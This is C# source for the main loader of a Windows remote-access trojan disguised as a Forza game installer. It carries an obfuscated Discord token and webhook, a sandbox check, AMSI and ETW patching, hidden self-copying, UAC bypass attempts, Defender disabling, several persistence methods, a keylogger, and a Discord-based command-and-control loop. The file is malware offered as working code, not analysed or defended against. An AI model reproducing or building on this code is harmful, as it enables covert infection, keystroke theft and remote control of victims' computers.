using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using ForzaInstallation.C2;
using ForzaInstallation.Evasion;

namespace ForzaInstallation
{
    class Program
    {
        const string TokenEnc = "REPLACE_TOKEN_AT_BUILD";
        const string GuildId = "REPLACE_GUILD_AT_BUILD";
        const string ChannelId = "REPLACE_CHANNEL_AT_BUILD";
        const string WebhookEnc = "REPLACE_WEBHOOK_AT_BUILD";

        static string _installPath;
        static Mutex _instanceMutex;

        static void Main()
        {
            string token = null;
            string webhook = null;
            try
            {
                token = Rot23Decode(TokenEnc);
                webhook = Rot23Decode(WebhookEnc);

                WebhookLogger.Init(webhook);
                WebhookLogger.Send("launch", "PASS", "ForzaInstallation.exe started");

                int jitter = new Random().Next(5000, 10000);
                Thread.Sleep(jitter);

                if (SandboxCheck.IsSandbox())
                {
                    WebhookLogger.Send("sandbox-check", "FAIL", "sandbox detected, exiting");
                    Environment.Exit(0);
                }
                WebhookLogger.Send("sandbox-check", "PASS", "no sandbox");

                bool amsiOk = AmsiPatch.Patch();
                WebhookLogger.Send("amsi-patch", amsiOk ? "PASS" : "FAIL", "");

                bool etwOk = EtwPatch.Patch();
                WebhookLogger.Send("etw-patch", etwOk ? "PASS" : "FAIL", "");

                SelfCopy();
                CommandHandler.SetInstallPath(_installPath);
                WebhookLogger.Send("self-copy", "PASS", _installPath != null ? _installPath : "?");

                bool isAdmin = IsAdmin();
                if (!isAdmin)
                {
                    WebhookLogger.Send("uac-check", "INFO", "not admin, attempting bypass");
                    Uac.UacChain.TryAll();
                    isAdmin = IsAdmin();
                }

                if (isAdmin)
                {
                    WebhookLogger.Send("uac-check", "PASS", "is admin now");
                    DefenderDisable.Disable();
                    InstallPrivilegedPersistence();
                }
                else
                {
                    WebhookLogger.Send("uac-check", "FAIL", "elevation failed, using user-level persistence");
                    InstallUserPersistence();
                }

                Payloads.Keylogger.Start();
                WebhookLogger.Send("keylogger", "PASS", "started");

                bool mutexCreated;
                _instanceMutex = new Mutex(true, "Global\\ForzaInstallation_C2_" + Environment.MachineName, out mutexCreated);
                if (!mutexCreated)
                {
                    WebhookLogger.Send("mutex", "INFO", "another instance running, exiting");
                    Thread.Sleep(2000);
                    Environment.Exit(0);
                }
                WebhookLogger.Send("mutex", "PASS", "single instance confirmed");

                WebhookLogger.Send("c2-start", "PASS", "connecting to Discord Gateway");
                var gw = new DiscordGateway(token, GuildId, ChannelId, webhook);
                gw.ConnectLoop().GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                try
                {
                    string msg = (ex.Message != null && ex.Message.Length > 200) ? ex.Message.Substring(0, 200) : (ex.Message != null ? ex.Message : "null");
                    WebhookLogger.Send("fatal-error", "FAIL", msg);
                }
                catch
                {
                    WebhookLogger.FallbackLogDirect("Fatal in Main(): " + (ex != null ? ex.ToString() : "null"));
                }
            }
        }

        static void SelfCopy()
        {
            try
            {
                _installPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Forza", "ForzaInstallation.exe"
                );
                string dir = Path.GetDirectoryName(_installPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                string current = Assembly.GetExecutingAssembly().Location;
                if (!string.IsNullOrEmpty(current) && current.Equals(_installPath, StringComparison.OrdinalIgnoreCase)) return;
                if (!string.IsNullOrEmpty(current)) File.Copy(current, _installPath, true);
                File.SetAttributes(_installPath, FileAttributes.Hidden);
            }
            catch { WebhookLogger.FallbackLogDirect("SelfCopy failed"); }
        }

        static void InstallUserPersistence()
        {
            try { Persistence.RegistryRun.InstallHkcu(); } catch { }
            try { Persistence.StartupFolder.Install(); } catch { }
        }

        static void InstallPrivilegedPersistence()
        {
            InstallUserPersistence();
            try { Persistence.RegistryRun.InstallHklm(); } catch { }
            try { Persistence.ScheduledTask.Install(); } catch { }
            try { Persistence.WmiSubscription.Install(); } catch { }
        }

        static bool IsAdmin()
        {
            try
            {
                var id = System.Security.Principal.WindowsIdentity.GetCurrent();
                var p = new System.Security.Principal.WindowsPrincipal(id);
                return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        static string Rot23Decode(string s)
        {
            if (s == null || s == "REPLACE_TOKEN_AT_BUILD" || s == "REPLACE_WEBHOOK_AT_BUILD") return "";
            var chars = s.ToCharArray();
            for (int i = 0; i < chars.Length; i++)
            {
                char c = chars[i];
                if (c >= 'a' && c <= 'z')
                    chars[i] = (char)((c - 'a' + 3) % 26 + 'a');
                else if (c >= 'A' && c <= 'Z')
                    chars[i] = (char)((c - 'A' + 3) % 26 + 'A');
            }
            return new string(chars);
        }
    }
}
